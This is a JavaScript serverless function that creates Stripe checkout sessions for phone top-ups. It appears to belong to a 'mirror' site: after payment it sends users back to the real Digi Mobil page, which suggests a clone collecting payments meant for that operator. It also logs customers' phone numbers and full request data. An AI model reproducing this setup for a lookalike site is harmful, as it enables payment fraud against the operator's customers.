const { MIRROR_DOMAIN } = require('./utils/constants');
const { createStripeCheckoutSession } = require('./utils/stripe');

exports.handler = async (event, context) => {
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
        'Access-Control-Max-Age': '86400'
      },
      body: ''
    };
  }

  try {
    const contentType = event.headers['content-type'] || '';
    let amount, phoneNumber, successUrl, cancelUrl;
    const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';

    console.log('api-create-payment starting with content-type:', contentType);

    if (contentType.includes('application/json')) {
      try {
        const data = JSON.parse(event.body);
        console.log('Payment JSON data received:', data);
        amount = data.amount;
        phoneNumber = data.phoneNumber;
        successUrl = data.successUrl || `https://www.digimobil.es/`;
        cancelUrl = data.cancelUrl || `https://${MIRROR_DOMAIN}/payment-cancel`;
      } catch (e) {
        console.error('Error parsing JSON:', e);
      }
    } else if (contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(event.body);
      phoneNumber = params.get('phoneNumber');
      amount = params.get('amount');
      successUrl = params.get('successUrl') || `https://${MIRROR_DOMAIN}/payment-success`;
      cancelUrl = params.get('cancelUrl') || `https://${MIRROR_DOMAIN}/payment-cancel`;
      console.log('Form data:', Object.fromEntries(params.entries()));
    } else {
      return {
        statusCode: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Unsupported content type' })
      };
    }

    // КРИТИЧНО: Виводимо отриманий номер телефону
    console.log('Received phone number:', phoneNumber);

    if (!amount || isNaN(parseFloat(amount))) {
      amount = '5';
      console.log('Invalid amount, using default:', amount);
    }

    console.log('Creating Stripe session with phone:', phoneNumber, 'amount:', amount);

    const { session } = await createStripeCheckoutSession(
      parseFloat(amount),
      phoneNumber,
      `https://www.digimobil.es/`,
      `https://${MIRROR_DOMAIN}/payment-cancel`,
      clientIP
    );

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*'
      },
      body: JSON.stringify({
        sessionId: session.id,
        url: session.url
      })
    };
  } catch (error) {
    console.error('Error in api-create-payment:', error);
    return {
      statusCode: 500,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: error.message })
    };
  }
};